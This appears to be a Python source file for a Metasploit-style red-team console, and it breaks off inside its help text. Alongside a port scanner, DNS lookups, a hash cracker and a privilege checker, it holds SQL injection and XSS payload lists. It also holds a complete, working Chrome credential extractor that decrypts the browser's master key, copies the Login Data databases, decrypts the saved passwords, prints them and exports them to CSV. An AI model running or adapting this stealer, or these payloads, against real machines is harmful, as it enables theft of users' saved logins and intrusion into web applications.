#!/usr/bin/env python3
"""
Red Team Toolkit - Metasploit Style Interface
Air-Gapped Environment Compatible
For Authorized Testing Only
"""

import socket
import sys
import threading
import hashlib
import itertools
import string
import time
import json
import os
import subprocess
import re
import csv
import sqlite3
import shutil
import tempfile
from datetime import datetime
from collections import defaultdict
import base64
import urllib.parse
import cmd
import shlex

try:
    import win32crypt
except ImportError:
    win32crypt = None

try:
    from Cryptodome.Cipher import AES
except ImportError:
    AES = None

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

# ============================================================================
# NETWORK & INFRASTRUCTURE TOOLS
# ============================================================================

class PortScanner:
    """TCP Port Scanner with service detection"""
    
    def __init__(self, target, ports, timeout=1):
        self.target = target
        self.ports = ports
        self.timeout = timeout
        self.open_ports = []
    
    def scan_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, port))
            if result == 0:
                try:
                    service = socket.getservbyport(port)
                except:
                    service = "unknown"
                self.open_ports.append((port, service))
                print(f"{Colors.GREEN}[+]{Colors.END} Port {port} OPEN - {service}")
            sock.close()
        except Exception as e:
            pass
    
    def scan(self):
        print(f"\n{Colors.BLUE}[*]{Colors.END} Scanning {self.target}...")
        threads = []
        for port in self.ports:
            t = threading.Thread(target=self.scan_port, args=(port,))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        return self.open_ports

class ServiceEnumerator:
    """Service version detection and banner grabbing"""
    
    @staticmethod
    def grab_banner(host, port, timeout=2):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            return banner
        except:
            return None
    
    @staticmethod
    def enumerate_services(host, ports):
        print(f"\n{Colors.BLUE}[*]{Colors.END} Enumerating services on {host}...")
        results = {}
        for port in ports:
            banner = ServiceEnumerator.grab_banner(host, port)
            if banner:
                results[port] = banner
                print(f"{Colors.GREEN}[+]{Colors.END} Port {port}:\n{banner[:200]}")
        return results

class DNSRecon:
    """DNS reconnaissance tool"""
    
    @staticmethod
    def resolve_host(hostname):
        try:
            ip = socket.gethostbyname(hostname)
            print(f"{Colors.GREEN}[+]{Colors.END} {hostname} -> {ip}")
            return ip
        except:
            print(f"{Colors.RED}[-]{Colors.END} Could not resolve {hostname}")
            return None
    
    @staticmethod
    def reverse_lookup(ip):
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            print(f"{Colors.GREEN}[+]{Colors.END} {ip} -> {hostname}")
            return hostname
        except:
            print(f"{Colors.RED}[-]{Colors.END} Could not reverse lookup {ip}")
            return None

# ============================================================================
# WEB APPLICATION TESTING TOOLS
# ============================================================================

class DirectoryBruteForcer:
    """Web directory brute force tool"""
    
    def __init__(self, base_url, wordlist):
        self.base_url = base_url.rstrip('/')
        self.wordlist = wordlist
        self.found = []
    
    def check_path(self, path):
        url = f"{self.base_url}/{path}"
        print(f"{Colors.BLUE}[*]{Colors.END} Testing: {url}")
        return False
    
    def bruteforce(self):
        print(f"\n{Colors.BLUE}[*]{Colors.END} Directory brute force on {self.base_url}")
        for word in self.wordlist:
            if self.check_path(word):
                self.found.append(word)
                print(f"{Colors.GREEN}[+]{Colors.END} Found: {word}")
        return self.found

class SQLInjectionTester:
    """SQL injection payload tester"""
    
    PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "' UNION SELECT NULL--",
        "1' ORDER BY 1--",
        "' AND 1=1--",
        "' AND 1=2--",
        "1' WAITFOR DELAY '0:0:5'--"
    ]
    
    @staticmethod
    def generate_payloads():
        print(f"\n{Colors.BLUE}[*]{Colors.END} SQL Injection Payloads")
        for i, payload in enumerate(SQLInjectionTester.PAYLOADS, 1):
            print(f"  {i}. {payload}")
        return SQLInjectionTester.PAYLOADS
    
    @staticmethod
    def test_parameter(param_value):
        results = []
        for payload in SQLInjectionTester.PAYLOADS:
            test_val = param_value + payload
            results.append(test_val)
            print(f"{Colors.BLUE}[*]{Colors.END} Testing: {test_val}")
        return results

class XSSPayloadGenerator:
    """XSS payload generator"""
    
    PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>"
    ]
    
    @staticmethod
    def generate_payloads():
        print(f"\n{Colors.BLUE}[*]{Colors.END} XSS Payloads")
        for i, payload in enumerate(XSSPayloadGenerator.PAYLOADS, 1):
            print(f"  {i}. {payload}")
        return XSSPayloadGenerator.PAYLOADS
    
    @staticmethod
    def encode_payload(payload, encoding='url'):
        if encoding == 'url':
            return urllib.parse.quote(payload)
        elif encoding == 'html':
            return payload.replace('<', '&lt;').replace('>', '&gt;')
        elif encoding == 'base64':
            return base64.b64encode(payload.encode()).decode()
        return payload

# ============================================================================
# PASSWORD & AUTHENTICATION TESTING
# ============================================================================

class PasswordAnalyzer:
    """Password strength analyzer"""
    
    @staticmethod
    def analyze_password(password):
        score = 0
        feedback = []
        
        if len(password) >= 8:
            score += 1
        else:
            feedback.append("Password should be at least 8 characters")
        
        if len(password) >= 12:
            score += 1
        
        if re.search(r'[a-z]', password):
            score += 1
        else:
            feedback.append("Add lowercase letters")
        
        if re.search(r'[A-Z]', password):
            score += 1
        else:
            feedback.append("Add uppercase letters")
        
        if re.search(r'[0-9]', password):
            score += 1
        else:
            feedback.append("Add numbers")
        
        if re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
            score += 1
        else:
            feedback.append("Add special characters")
        
        strength = "Weak"
        if score >= 5:
            strength = "Strong"
        elif score >= 3:
            strength = "Medium"
        
        print(f"\n{Colors.BLUE}[*]{Colors.END} Password Analysis")
        print(f"Password: {password}")
        print(f"Length: {len(password)}")
        print(f"Strength: {strength} (Score: {score}/6)")
        if feedback:
            print(f"Recommendations:")
            for item in feedback:
                print(f"  - {item}")
        
        return score, strength, feedback

class HashCracker:
    """Simple hash cracker with common algorithms"""
    
    @staticmethod
    def hash_password(password, algorithm='md5'):
        if algorithm == 'md5':
            return hashlib.md5(password.encode()).hexdigest()
        elif algorithm == 'sha1':
            return hashlib.sha1(password.encode()).hexdigest()
        elif algorithm == 'sha256':
            return hashlib.sha256(password.encode()).hexdigest()
        return None
    
    @staticmethod
    def crack_hash(target_hash, wordlist, algorithm='md5'):
        print(f"\n{Colors.BLUE}[*]{Colors.END} Attempting to crack hash: {target_hash}")
        print(f"{Colors.BLUE}[*]{Colors.END} Algorithm: {algorithm}")
        
        for word in wordlist:
            word = word.strip()
            test_hash = HashCracker.hash_password(word, algorithm)
            if test_hash == target_hash:
                print(f"{Colors.GREEN}[+]{Colors.END} CRACKED! Password: {word}")
                return word
        
        print(f"{Colors.RED}[-]{Colors.END} Hash not cracked")
        return None

class BrowserCredentialExtractor:
    """Extract saved Google Chrome credentials on Windows."""

    PROFILE_PATTERN = re.compile(r"^(Default|Profile \d+)$")

    @staticmethod
    def default_user_data_dir():
        user_profile = os.environ.get('USERPROFILE', '')
        if not user_profile:
            return ''
        return os.path.normpath(
            os.path.join(user_profile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
        )

    @classmethod
    def local_state_path(cls, user_data_dir=None):
        base_dir = user_data_dir or cls.default_user_data_dir()
        if not base_dir:
            return ''
        return os.path.join(base_dir, 'Local State')

    @staticmethod
    def validate_environment():
        if sys.platform != 'win32':
            raise RuntimeError("Chrome credential extraction is only supported on Windows hosts")
        if win32crypt is None:
            raise RuntimeError("Missing dependency: pywin32 (win32crypt)")
        if AES is None:
            raise RuntimeError("Missing dependency: pycryptodomex (Cryptodome)")

    @classmethod
    def get_secret_key(cls, user_data_dir=None):
        cls.validate_environment()
        local_state_path = cls.local_state_path(user_data_dir)
        if not local_state_path or not os.path.exists(local_state_path):
            raise FileNotFoundError(f"Chrome Local State file not found: {local_state_path}")

        with open(local_state_path, 'r', encoding='utf-8') as handle:
            local_state = json.load(handle)

        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        if encrypted_key.startswith(b'DPAPI'):
            encrypted_key = encrypted_key[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    @classmethod
    def list_profiles(cls, user_data_dir=None):
        base_dir = user_data_dir or cls.default_user_data_dir()
        if not base_dir or not os.path.isdir(base_dir):
            raise FileNotFoundError(f"Chrome user data directory not found: {base_dir}")

        profiles = []
        for entry in os.listdir(base_dir):
            full_path = os.path.join(base_dir, entry)
            if os.path.isdir(full_path) and cls.PROFILE_PATTERN.match(entry):
                profiles.append(entry)

        return sorted(profiles, key=lambda name: (name != 'Default', name))

    @staticmethod
    def decrypt_password(ciphertext, secret_key):
        if isinstance(ciphertext, memoryview):
            ciphertext = ciphertext.tobytes()

        if not ciphertext:
            return ''

        if ciphertext[:3] in (b'v10', b'v11'):
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
            return cipher.decrypt(encrypted_password).decode('utf-8', errors='ignore')

        return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode(
            'utf-8',
            errors='ignore',
        )

    @staticmethod
    def open_login_db(login_db_path):
        if not os.path.exists(login_db_path):
            raise FileNotFoundError(f"Chrome login database not found: {login_db_path}")

        temp_handle = tempfile.NamedTemporaryFile(prefix='Loginvault_', suffix='.db', delete=False)
        temp_handle.close()
        shutil.copy2(login_db_path, temp_handle.name)
        return sqlite3.connect(temp_handle.name), temp_handle.name

    @staticmethod
    def export_to_csv(credentials, output_csv):
        with open(output_csv, mode='w', newline='', encoding='utf-8') as handle:
            writer = csv.writer(handle)
            writer.writerow(['index', 'browser', 'profile', 'url', 'username', 'password'])
            for index, item in enumerate(credentials, 1):
                writer.writerow([
                    index,
                    item['browser'],
                    item['profile'],
                    item['url'],
                    item['username'],
                    item['password'],
                ])

    @classmethod
    def extract_credentials(cls, user_data_dir=None, output_csv=None):
        cls.validate_environment()
        user_data_dir = user_data_dir or cls.default_user_data_dir()
        secret_key = cls.get_secret_key(user_data_dir)
        profiles = cls.list_profiles(user_data_dir)

        if not profiles:
            print(f"{Colors.YELLOW}[*]{Colors.END} No Chrome profiles found in {user_data_dir}")
            return []

        credentials = []
        print(f"\n{Colors.BLUE}[*]{Colors.END} Chrome credential extraction")
        print(f"{Colors.BLUE}[*]{Colors.END} User data directory: {user_data_dir}")

        for profile in profiles:
            login_db_path = os.path.join(user_data_dir, profile, 'Login Data')
            if not os.path.exists(login_db_path):
                print(f"{Colors.YELLOW}[*]{Colors.END} Skipping {profile}: Login Data not found")
                continue

            print(f"\n{Colors.BLUE}[*]{Colors.END} Reading profile: {profile}")
            connection = None
            temp_path = None
            try:
                connection, temp_path = cls.open_login_db(login_db_path)
                cursor = connection.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                rows = cursor.fetchall()
                cursor.close()
            finally:
                if connection:
                    connection.close()
                if temp_path and os.path.exists(temp_path):
                    os.remove(temp_path)

            for url, username, ciphertext in rows:
                if not url or not username or not ciphertext:
                    continue

                try:
                    password = cls.decrypt_password(ciphertext, secret_key)
                except Exception as exc:
                    print(f"{Colors.RED}[-]{Colors.END} Failed to decrypt entry for {url}: {exc}")
                    continue

                record = {
                    'browser': 'chrome',
                    'profile': profile,
                    'url': url,
                    'username': username,
                    'password': password,
                }
                credentials.append(record)
                print(f"{Colors.GREEN}[+]{Colors.END} {profile} | {url} | {username} | {password}")

        if output_csv:
            cls.export_to_csv(credentials, output_csv)
            print(f"\n{Colors.GREEN}[+]{Colors.END} Credentials exported to {output_csv}")

        print(f"\n{Colors.GREEN}[+]{Colors.END} Extracted {len(credentials)} credential(s)")
        return credentials

class BruteForceAuth:
    """Brute force authentication tester"""
    
    @staticmethod
    def generate_passwords(length=4, charset=string.ascii_lowercase):
        for combo in itertools.product(charset, repeat=length):
            yield ''.join(combo)
    
    @staticmethod
    def test_credentials(username, password):
        print(f"{Colors.BLUE}[*]{Colors.END} Testing: {username}:{password}")
        return False

# ============================================================================
# SYSTEM ANALYSIS TOOLS
# ============================================================================

class ProcessMonitor:
    """Process monitoring utility"""
    
    @staticmethod
    def list_processes():
        print(f"\n{Colors.BLUE}[*]{Colors.END} Process Monitor")
        try:
            if sys.platform == 'win32':
                output = subprocess.check_output(['tasklist'], text=True)
            else:
                output = subprocess.check_output(['ps', 'aux'], text=True)
            print(output[:2000])
            return output
        except Exception as e:
            print(f"{Colors.RED}[-]{Colors.END} Error: {e}")
            return None

class FileIntegrityChecker:
    """File integrity checker using hashes"""
    
    @staticmethod
    def hash_file(filepath):
        try:
            hasher = hashlib.sha256()
            with open(filepath, 'rb') as f:
                buf = f.read()
                hasher.update(buf)
            return hasher.hexdigest()
        except Exception as e:
            return None
    
    @staticmethod
    def check_directory(directory):
        print(f"\n{Colors.BLUE}[*]{Colors.END} File Integrity Check: {directory}")
        hashes = {}
        try:
            for root, dirs, files in os.walk(directory):
                for file in files[:50]:
                    filepath = os.path.join(root, file)
                    file_hash = FileIntegrityChecker.hash_file(filepath)
                    if file_hash:
                        hashes[filepath] = file_hash
                        print(f"{Colors.GREEN}[+]{Colors.END} {filepath}: {file_hash[:16]}...")
        except Exception as e:
            print(f"{Colors.RED}[-]{Colors.END} Error: {e}")
        return hashes

class PrivilegeChecker:
    """Check for privilege escalation vectors"""
    
    @staticmethod
    def check_privileges():
        print(f"\n{Colors.BLUE}[*]{Colors.END} Privilege Escalation Checker")
        
        if sys.platform != 'win32':
            print(f"\n{Colors.BLUE}[*]{Colors.END} Checking for SUID binaries...")
            try:
                output = subprocess.check_output(
                    ['find', '/', '-perm', '-4000', '-type', 'f', '2>/dev/null'],
                    text=True, timeout=10
                )
                print(output[:1000])
            except:
                pass
            
            print(f"\n{Colors.BLUE}[*]{Colors.END} Checking sudo permissions...")
            try:
                output = subprocess.check_output(['sudo', '-l'], text=True)
                print(output)
            except:
                print(f"{Colors.RED}[-]{Colors.END} Cannot check sudo permissions")
        else:
            print(f"{Colors.BLUE}[*]{Colors.END} Windows privilege checks...")
            try:
                output = subprocess.check_output(['whoami', '/all'], text=True)
                print(output[:1000])
            except:
                pass

# ============================================================================
# REPORTING & DOCUMENTATION TOOLS
# ============================================================================

class VulnerabilityReport:
    """Generate vulnerability reports"""
    
    def __init__(self):
        self.findings = []
    
    def add_finding(self, title, severity, description, remediation):
        finding = {
            'timestamp': datetime.now().isoformat(),
            'title': title,
            'severity': severity,
            'description': description,
            'remediation': remediation
        }
        self.findings.append(finding)
        print(f"{Colors.GREEN}[+]{Colors.END} Finding added: {title}")
    
    def generate_report(self, output_file='vulnerability_report.json'):
        report = {
            'generated': datetime.now().isoformat(),
            'findings_count': len(self.findings),
            'findings': self.findings
        }
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n{Colors.GREEN}[+]{Colors.END} Vulnerability Report Generated")
        print(f"{Colors.GREEN}[+]{Colors.END} Saved to: {output_file}")
        print(f"{Colors.GREEN}[+]{Colors.END} Total findings: {len(self.findings)}")
        
        return report
    
    def print_summary(self):
        if not self.findings:
            print(f"{Colors.YELLOW}[*]{Colors.END} No findings to display")
            return
            
        print(f"\n{Colors.HEADER}{'='*60}{Colors.END}")
        print(f"{Colors.BOLD}VULNERABILITY REPORT SUMMARY{Colors.END}")
        print(f"{Colors.HEADER}{'='*60}{Colors.END}\n")
        
        severity_counts = defaultdict(int)
        for finding in self.findings:
            severity_counts[finding['severity']] += 1
        
        for severity, count in severity_counts.items():
            color = Colors.RED if severity == 'Critical' else Colors.YELLOW if severity == 'High' else Colors.BLUE
            print(f"{color}{severity}: {count}{Colors.END}")
        
        print(f"\n{Colors.BLUE}[*]{Colors.END} Findings:")
        for i, finding in enumerate(self.findings, 1):
            print(f"\n{i}. {finding['title']} [{finding['severity']}]")
            print(f"   {finding['description'][:100]}...")

# ============================================================================
# METASPLOIT-STYLE CLI INTERFACE
# ============================================================================

class RedTeamConsole(cmd.Cmd):
    """Metasploit-style interactive console"""
    
    intro = f"""{Colors.HEADER}
    ╦═╗╔═╗╔╦╗  ╔╦╗╔═╗╔═╗╔╦╗  ╔╦╗╔═╗╔═╗╦  ╦╔═╦╔╦╗
    ╠╦╝║╣  ║║   ║ ║╣ ╠═╣║║║   ║ ║ ║║ ║║  ╠╩╗║ ║ 
    ╩╚═╚═╝═╩╝   ╩ ╚═╝╩ ╩╩ ╩   ╩ ╚═╝╚═╝╩═╝╩ ╩╩ ╩ 
{Colors.END}
    {Colors.YELLOW}Educational Red Team Framework v1.0{Colors.END}
    {Colors.BLUE}Air-Gapped Environment Compatible{Colors.END}
    
    Type 'help' or '?' to list commands.
    Type 'show modules' to see available modules.
    Type 'gui' to launch graphical interface.
"""
    
    prompt = f'{Colors.RED}rtf{Colors.END} > '
    
    def __init__(self):
        super().__init__()
        self.current_module = None
        self.module_options = {}
        self.vuln_report = VulnerabilityReport()
        
        # Module definitions
        self.modules = {
            'scanner/portscan': {
                'name': 'Port Scanner',
                'description': 'TCP port scanner with service detection',
                'options': {
                    'RHOSTS': {'required': True, 'default': '127.0.0.1', 'description': 'Target IP address'},
                    'PORTS': {'required': True, 'default': '1-1000', 'description': 'Port range (e.g., 1-1000)'},
                },
                'class': PortScanner
            },
            'scanner/service_enum': {
                'name': 'Service Enumerator',
                'description': 'Banner grabbing and service detection',
                'options': {
                    'RHOSTS': {'required': True, 'default': '127.0.0.1', 'description': 'Target IP address'},
                },
                'class': ServiceEnumerator
            },
            'recon/dns': {
                'name': 'DNS Reconnaissance',
                'description': 'DNS forward and reverse lookup',
                'options': {
                    'TARGET': {'required': True, 'default': 'example.com', 'description': 'Hostname or IP'},
                    'MODE': {'required': True, 'default': 'resolve', 'description': 'Mode: resolve or reverse'},
                },
                'class': DNSRecon
            },
            'webapp/sqli': {
                'name': 'SQL Injection Tester',
                'description': 'Generate SQL injection payloads',
                'options': {
                    'PARAM': {'required': False, 'default': '1', 'description': 'Parameter value to test'},
                },
                'class': SQLInjectionTester
            },
            'webapp/xss': {
                'name': 'XSS Payload Generator',
                'description': 'Generate XSS payloads with encoding',
                'options': {
                    'ENCODING': {'required': False, 'default': 'none', 'description': 'Encoding: none, url, html, base64'},
                },
                'class': XSSPayloadGenerator
            },
            'webapp/dir_brute': {
                'name': 'Directory Brute Forcer',
                'description': 'Web directory enumeration',
                'options': {
                    'URL': {'required': True, 'default': 'http://example.com', 'description': 'Base URL'},
                },
                'class': DirectoryBruteForcer
            },
            'password/analyzer': {
                'name': 'Password Analyzer',
                'description': 'Password strength analysis',
                'options': {
                    'PASSWORD': {'required': True, 'default': '', 'description': 'Password to analyze'},
                },
                'class': PasswordAnalyzer
            },
            'password/hash_crack': {
                'name': 'Hash Cracker',
                'description': 'Crack password hashes',
                'options': {
                    'HASH': {'required': True, 'default': '', 'description': 'Hash to crack'},
                    'ALGORITHM': {'required': True, 'default': 'md5', 'description': 'Algorithm: md5, sha1, sha256'},
                    'WORDLIST': {'required': True, 'default': 'password,123456,admin', 'description': 'Comma-separated wordlist'},
                },
                'class': HashCracker
            },
            'password/browser_creds': {
                'name': 'Chrome Credential Extractor',
                'description': 'Extract saved Chrome credentials from local profiles',
                'options': {
                    'USER_DATA_DIR': {'required': False, 'default': BrowserCredentialExtractor.default_user_data_dir(), 'description': 'Chrome User Data directory'},
                    'OUTPUT_CSV': {'required': False, 'default': '', 'description': 'Optional CSV export path'},
                },
                'class': BrowserCredentialExtractor
            },
            'system/proc_mon': {
                'name': 'Process Monitor',
                'description': 'List running processes',
                'options': {},
                'class': ProcessMonitor
            },
            'system/file_check': {
                'name': 'File Integrity Checker',
                'description': 'Check file integrity with hashes',
                'options': {
                    'DIRECTORY': {'required': True, 'default': '.', 'description': 'Directory to check'},
                },
                'class': FileIntegrityChecker
            },
            'system/priv_check': {
                'name': 'Privilege Checker',
                'description': 'Check for privilege escalation vectors',
                'options': {},
                'class': PrivilegeChecker
            },
        }
    
    def do_gui(self, arg):
        """Launch graphical interface"""
        print(f"{Colors.YELLOW}[*]{Colors.END} Launching GUI...")
        try:
            import subprocess
            subprocess.run([sys.executable, 'gui.py'])
        except Exception as e:
            print(f"{Colors.RED}[-]{Colors.END} Error launching GUI: {e}")
            print(f"{Colors.YELLOW}[*]{Colors.END} Make sure gui.py is in the same directory")
    
    def do_show(self, arg):
        """Show modules, options, or findings"""
        if arg == 'modules':
            self.show_modules()
        elif arg == 'options':
            self.show_options()
        elif arg == 'findings':
            self.vuln_report.print_summary()
        else:
            print(f"{Colors.RED}[-]{Colors.END} Unknown show command. Try: modules, options, findings")
    
    def show_modules(self):
        """Display available modules"""
        print(f"\n{Colors.HEADER}Available Modules:{Colors.END}\n")
        
        categories = {}
        for module_path, module_info in self.modules.items():
            category = module_path.split('/')[0]
            if category not in categories:
                categories[category] = []
            categories[category].append((module_path, module_info))
        
        for category, mods in sorted(categories.items()):
            print(f"{Colors.BLUE}{category.upper()}{Colors.END}")
            for mod_path, mod_info in mods:
                print(f"  {mod_path:<30} {mod_info['description']}")
            print()
    
    def show_options(self):
        """Display current module options"""
        if not self.current_module:
            print(f"{Colors.RED}[-]{Colors.END} No module selected. Use 'use <module>' first")
            return
        
        module_info = self.modules[self.current_module]
        print(f"\n{Colors.HEADER}Module: {module_info['name']}{Colors.END}")
        print(f"{module_info['description']}\n")
        
        if module_info['options']:
            print(f"{'Option':<15} {'Current Value':<20} {'Required':<10} {'Description'}")
            print(f"{'-'*70}")
            for opt_name, opt_info in module_info['options'].items():
                current = self.module_options.get(opt_name, opt_info['default'])
                required = 'yes' if opt_info['required'] else 'no'
                print(f"{opt_name:<15} {str(current):<20} {required:<10} {opt_info['description']}")
        else:
            print("No options required for this module")
    
    def do_use(self, arg):
        """Select a module: use <module_path>"""
        if not arg:
            print(f"{Colors.RED}[-]{Colors.END} Usage: use <module_path>")
            return
        
        if arg in self.modules:
            self.current_module = arg
            module_info = self.modules[arg]
            self.module_options = {k: v['default'] for k, v in module_info['options'].items()}
            self.prompt = f'{Colors.RED}rtf{Colors.END} ({Colors.GREEN}{arg}{Colors.END}) > '
            print(f"{Colors.GREEN}[+]{Colors.END} Module selected: {module_info['name']}")
        else:
            print(f"{Colors.RED}[-]{Colors.END} Module not found. Use 'show modules' to list available modules")
    
    def do_set(self, arg):
        """Set module option: set <option> <value>"""
        if not self.current_module:
            print(f"{Colors.RED}[-]{Colors.END} No module selected")
            return
        
        try:
            parts = shlex.split(arg)
            if len(parts) < 2:
                print(f"{Colors.RED}[-]{Colors.END} Usage: set <option> <value>")
                return
            
            option = parts[0].upper()
            value = ' '.join(parts[1:])
            
            if option in self.modules[self.current_module]['options']:
                self.module_options[option] = value
                print(f"{Colors.GREEN}[+]{Colors.END} {option} => {value}")
            else:
                print(f"{Colors.RED}[-]{Colors.END} Unknown option: {option}")
        except Exception as e:
            print(f"{Colors.RED}[-]{Colors.END} Error: {e}")
    
    def do_run(self, arg):
        """Execute the current module"""
        if not self.current_module:
            print(f"{Colors.RED}[-]{Colors.END} No module selected")
            return
        
        module_info = self.modules[self.current_module]
        
        # Check required options
        for opt_name, opt_info in module_info['options'].items():
            if opt_info['required'] and not self.module_options.get(opt_name):
                print(f"{Colors.RED}[-]{Colors.END} Required option {opt_name} not set")
                return
        
        print(f"\n{Colors.BLUE}[*]{Colors.END} Running module: {module_info['name']}")
        
        # Execute module
        try:
            if self.current_module == 'scanner/portscan':
                target = self.module_options['RHOSTS']
                port_range = self.module_options['PORTS']
                start, end = map(int, port_range.split('-'))
                scanner = PortScanner(target, range(start, end + 1))
                scanner.scan()
            
            elif self.current_module == 'scanner/service_enum':
                target = self.module_options['RHOSTS']
                ports = [21, 22, 23, 25, 80, 443, 3306, 5432, 8080]
                ServiceEnumerator.enumerate_services(target, ports)
            
            elif self.current_module == 'recon/dns':
                target = self.module_options['TARGET']
                mode = self.module_options['MODE']
                if mode == 'resolve':
                    DNSRecon.resolve_host(target)
                else:
                    DNSRecon.reverse_lookup(target)
            
            elif self.current_module == 'webapp/sqli':
                SQLInjectionTester.generate_payloads()
            
            elif self.current_module == 'webapp/xss':
                XSSPayloadGenerator.generate_payloads()
            
            elif self.current_module == 'webapp/dir_brute':
                url = self.module_options['URL']
                wordlist = ['admin', 'login', 'test', 'backup', 'config']
                brute = DirectoryBruteForcer(url, wordlist)
                brute.bruteforce()
            
            elif self.current_module == 'password/analyzer':
                password = self.module_options['PASSWORD']
                PasswordAnalyzer.analyze_password(password)
            
            elif self.current_module == 'password/hash_crack':
                target_hash = self.module_options['HASH']
                algorithm = self.module_options['ALGORITHM']
                wordlist = self.module_options['WORDLIST'].split(',')
                HashCracker.crack_hash(target_hash, wordlist, algorithm)

            elif self.current_module == 'password/browser_creds':
                user_data_dir = self.module_options.get('USER_DATA_DIR') or None
                output_csv = self.module_options.get('OUTPUT_CSV') or None
                BrowserCredentialExtractor.extract_credentials(user_data_dir, output_csv)
            
            elif self.current_module == 'system/proc_mon':
                ProcessMonitor.list_processes()
            
            elif self.current_module == 'system/file_check':
                directory = self.module_options['DIRECTORY']
                FileIntegrityChecker.check_directory(directory)
            
            elif self.current_module == 'system/priv_check':
                PrivilegeChecker.check_privileges()
            
            print(f"\n{Colors.GREEN}[+]{Colors.END} Module execution completed")
            
        except Exception as e:
            print(f"{Colors.RED}[-]{Colors.END} Error executing module: {e}")
    
    def do_exploit(self, arg):
        """Alias for run"""
        self.do_run(arg)
    
    def do_back(self, arg):
        """Return to main menu"""
        self.current_module = None
        self.module_options = {}
        self.prompt = f'{Colors.RED}rtf{Colors.END} > '
    
    def do_banner(self, arg):
        """Display banner"""
        print(self.intro)
    
    def do_report(self, arg):
        """Report management: report add, report show, report export"""
        if not arg:
            print(f"{Colors.RED}[-]{Colors.END} Usage: report <add|show|export>")
            return
        
        if arg == 'add':
            print(f"\n{Colors.BLUE}[*]{Colors.END} Add Finding")
            title = input("Title: ")
            severity = input("Severity (Critical/High/Medium/Low/Info): ")
            description = input("Description: ")
            remediation = input("Remediation: ")
            self.vuln_report.add_finding(title, severity, description, remediation)
        
        elif arg == 'show':
            self.vuln_report.print_summary()
        
        elif arg == 'export':
            filename = input("Filename [vulnerability_report.json]: ") or "vulnerability_report.json"
            self.vuln_report.generate_report(filename)
        
        else:
            print(f"{Colors.RED}[-]{Colors.END} Unknown report command")
    
    def do_search(self, arg):
        """Search for modules: search <keyword>"""
        if not arg:
            print(f"{Colors.RED}[-]{Colors.END} Usage: search <keyword>")
            return
        
        results = []
        for module_path, module_info in self.modules.items():
            if (arg.lower() in module_path.lower() or 
                arg.lower() in module_info['name'].lower() or 
                arg.lower() in module_info['description'].lower()):
                results.append((module_path, module_info))
        
        if results:
            print(f"\n{Colors.GREEN}[+]{Colors.END} Found {len(results)} module(s):\n")
            for mod_path, mod_info in results:
                print(f"  {mod_path:<30} {mod_info['description']}")
        else:
            print(f"{Colors.RED}[-]{Colors.END} No modules found matching '{arg}'")
    
    def do_info(self, arg):
        """Display detailed information about a module"""
        if not arg and not self.current_module:
            print(f"{Colors.RED}[-]{Colors.END} Usage: info <module> or select a module first")
            return
        
        module = arg if arg else self.current_module
        
        if module not in self.modules:
            print(f"{Colors.RED}[-]{Colors.END} Module not found")
            return
        
        module_info = self.modules[module]
        print(f"\n{Colors.HEADER}{'='*60}{Colors.END}")
        print(f"{Colors.BOLD}{module_info['name']}{Colors.END}")
        print(f"{Colors.HEADER}{'='*60}{Colors.END}\n")
        print(f"{Colors.BLUE}Path:{Colors.END} {module}")
        print(f"{Colors.BLUE}Description:{Colors.END} {module_info['description']}\n")
        
        if module_info['options']:
            print(f"{Colors.BLUE}Options:{Colors.END}\n")
            for opt_name, opt_info in module_info['options'].items():
                required = f"{Colors.RED}Required{Colors.END}" if opt_info['required'] else "Optional"
                print(f"  {opt_name}")
                print(f"    Required: {required}")
                print(f"    Default: {opt_info['default']}")
                print(f"    Description: {opt_info['description']}\n")
    
    def do_clear(self, arg):
        """Clear the screen"""
        os.system('clear' if os.name != 'nt' else 'cls')
    
    def do_exit(self, arg):
        """Exit the console"""
        print(f"\n{Colors.YELLOW}[*]{Colors.END} Exiting Red Team Framework...")
        return True
    
    def do_quit(self, arg):
        """Exit the console"""
        return self.do_exit(arg)
    
    def do_EOF(self, arg):
        """Handle Ctrl+D"""
        print()
        return True
    
    def default(self, line):
        """Handle unknown commands"""
        print(f"{Colors.RED}[-]{Colors.END} Unknown command: {line}")
        print(f"{Colors.YELLOW}[*]{Colors.END} Type 'help' for available commands")
    
    def emptyline(self):
        """Do nothing on empty line"""
        pass
    
    def completedefault(self, text, line, begidx, endidx):
        """Tab completion for module names"""
        if line.startswith('use ') or line.startswith('info '):
            return [m for m in self.modules.keys() if m.startswith(text)]
        return []

# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

def main():
    if len(sys.argv) > 1 and sys.argv[1] == '--help':
        print(f"""
{Colors.HEADER}Red Team Framework - Usage{Colors.END}

{Colors.BLUE}Interactive Console (Metasploit-style):{Colors.END}
  python3 redteam_toolkit.py              Launch interactive console

{Colors.BLUE}Graphical Interface:{Colors.END}
